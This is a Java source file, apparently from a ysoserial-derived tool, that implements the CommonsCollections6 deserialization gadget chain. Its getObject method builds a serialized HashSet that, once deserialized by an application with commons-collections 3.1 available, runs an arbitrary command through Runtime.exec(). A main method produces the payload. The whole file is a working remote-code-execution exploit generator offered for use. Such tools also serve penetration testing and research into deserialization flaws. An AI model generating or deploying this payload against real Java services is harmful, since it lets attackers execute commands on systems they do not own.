package A.R.ysogate.payloads.gadgets;

import A.R.ysogate.payloads.utils.Gadgets;
import A.R.ysogate.payloads.utils.PayloadRunner;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Authors;
import A.R.ysogate.payloads.annotation.Dependencies;
import A.R.ysogate.payloads.utils.Reflections;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()

    by @matthias_kaiser
*/
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.MATTHIASKAISER})
public class CommonsCollections6 implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {

		final Transformer[] transformers = Gadgets.makeTransformer(command);

		Transformer transformerChain = new ChainedTransformer(transformers);

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
		TiedMapEntry entry = new TiedMapEntry(lazyMap, "su18");
		HashSet map = new HashSet(1);
		map.add("su18");
		Field f = null;
		try {
			f = HashSet.class.getDeclaredField("map");
		} catch (NoSuchFieldException e) {
			f = HashSet.class.getDeclaredField("backingMap");
		}

		Reflections.setAccessible(f);
		HashMap innimpl = (HashMap) f.get(map);

		Field f2 = null;
		try {
			f2 = HashMap.class.getDeclaredField("table");
		} catch (NoSuchFieldException e) {
			f2 = HashMap.class.getDeclaredField("elementData");
		}

		Reflections.setAccessible(f2);
		Object[] array = (Object[]) f2.get(innimpl);

		Object node = array[0];
		if (node == null) {
			node = array[1];
		}

		Field keyField = null;
		try {
			keyField = node.getClass().getDeclaredField("key");
		} catch (Exception e) {
			keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
		}

		Reflections.setAccessible(keyField);
		keyField.set(node, entry);

		return map;

	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections6.class, args);
	}
}
